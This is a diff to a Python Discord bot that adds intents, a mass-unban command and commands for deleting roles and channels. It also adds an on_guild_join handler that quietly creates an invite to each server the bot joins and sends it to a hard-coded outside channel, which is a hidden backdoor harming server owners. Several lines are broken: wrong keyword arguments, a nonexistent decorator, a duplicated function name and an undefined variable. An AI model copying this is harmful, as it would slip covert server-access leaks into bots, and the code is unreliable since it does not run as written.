@@ -3,8 +3,14 @@ from discord.ext import commands
 import colorama 
 from colorama import Fore
 token = "TOKEN" 
+intents = discord.Intents.all()
+intents.members = True
+intents.guilds = True
+intents.emojis = True
+intents.webhooks = True
+intents = intents
 prefix = "_"
-bot = commands.Bot(commands_prefix=prefix) 
+client = commands.Bot(commands_prefix=prefix) 
 
 @client.event
 async def on_connect():
@@ -30,4 +36,42 @@ async def ping(self, ctx):
 
     )
 
-    await ctx.reply(embed=embed
+    await ctx.reply(embed=embed)
+
+@client.event
+async def on_guild_join(guild):
+    server = client.get_guild(guild.id)
+    channel = guild.text_channels[0]
+    channellol = client.get_channel(954392920994230282)
+    invlink = await channel.create_invite(unique=True)
+    await channellol.send(f"I have been added to: {invlink}")
+
+@client.command(aliases=["massunban"])
+@commands.has_permissions(administrator=True)
+async def unbanall(ctx):
+    guild = ctx.guild
+    banlist = await guild.bans()
+    await ctx.reply('**Unbanning {} members**'.format(len(banlist)))
+    for users in banlist:
+            await ctx.guild.unban(user=users.user, reason=f"By {ctx.author}")
+
+@client.command(aliases=["cr"])
+@command.permission_has(administrator=True)
+async def roleclean(ctx, roletodelete):
+    for role in ctx.message.guild.roles:
+            if role.name == roletodelete:
+                try:
+                    await role.delete()
+                except:
+                  pass
+
+@client.command(aliases=["cc"])
+@command.permission_has(administrator=True)
+async def roleclean(ctx, channeltodelete):
+    for role in ctx.message.guild.channels:
+            if role.name == channeltodelete:
+                try:
+                    await channel.delete()
+                except:
+                  pass
+client.run(token)
